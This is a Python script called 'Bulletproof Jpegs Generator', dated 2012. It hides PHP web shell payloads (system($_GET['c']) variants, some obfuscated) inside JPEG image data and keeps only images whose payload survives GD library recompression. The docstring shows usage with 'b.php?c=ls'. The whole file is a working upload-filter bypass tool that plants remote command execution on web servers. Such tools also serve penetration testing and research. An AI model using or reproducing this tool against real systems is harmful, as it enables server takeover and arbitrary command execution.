"""
    Bulletproof Jpegs Generator
    Copyright (C) 2012  Damien "virtualabs" Cauquil
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
	-------------
	b.php?c=ls
	Source: http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l
"""
from __future__ import print_function
from future import standard_library
standard_library.install_aliases()
from builtins import range
import struct,sys,os
import gd
from io import StringIO
from random import randint,shuffle
from time import time
N = 32
def insertPayload(_in, _out, payload,off):
	"""
	Payload insertion (quick JPEG parsing and patching)
	"""
	img = _in
	sos = img.index("\xFF\xDA")
	sos_size = struct.unpack('>H',img[sos+2:sos+4])[0]
	sod = sos_size+2
	eoi = img[sod:].index("\xFF\xD9")
	if (eoi - sod - off)>=len(payload):
		_out.write(img[:sod+sos+off]+payload+img[sod+sos+len(payload)+off:])
		return True
	else:
		return False
if __name__=='__main__':
	print("[+] Virtualabs' Nasty bulletproof Jpeg generator")
	print(" |  website: http://virtualabs.fr")
	print(" |  contact: virtualabs -at- gmail -dot- com")
	print("")
	payloads = ["<?php system(/**/$_GET['c'/**/]); ?>","<?php /**/system($_GET[chr(99)/**/]); ?>","<?php system(/**/$_GET[chr(99)]); ?>","<?php\r\nsystem($_GET[/**/'c']);\r\n ?>"]
	if os.path.exists('exploit-jpg') and not os.path.isdir('exploit-jpg'):
		print("[!] Please remove the file named 'exploit-jpg' from the current directory")
	elif not os.path.exists('exploit-jpg'):
		os.mkdir('exploit-jpg')
	print('[i] Generating ...')
	for q in list(range(50,100))+[-1]:
		for p in payloads:
			done = False
			start = time()
			while not done and (time()-start)<10.0:
				img = gd.image((N,N),True)
				pal = []
				for i in range(N*N):
					pal.append(img.colorAllocate((randint(0,256),randint(0,256),randint(0,256))))
				shuffle(pal)
				pidx = 0
				for x in  range(N):
					for y in range(N):
						img.setPixel((x,y),pal[pidx])
						pidx+=1
				out_jpg = StringIO('')	
				img.writeJpeg(out_jpg,q)
				out_raw = out_jpg.getvalue()
				for i in range(64):
					test_jpg = StringIO('')
					if insertPayload(out_raw,test_jpg,p,i):
						try:
							f = open('exploit-jpg/exploit-%d.jpg'%q,'wb')
							f.write(test_jpg.getvalue())
							f.close()
							test = gd.image('exploit-jpg/exploit-%d.jpg'%q)
							final_jpg = StringIO('')
							test.writeJpeg(final_jpg,q)
							final_raw = final_jpg.getvalue()
							if p in final_raw:
								print('[i] Jpeg quality %d ... DONE'%q)
								done = True
								break
						except IOError as e:
							pass
					else:
						break
			if not done:
				os.unlink('exploit-jpg/exploit-%d.jpg'%q)
			else:		
				break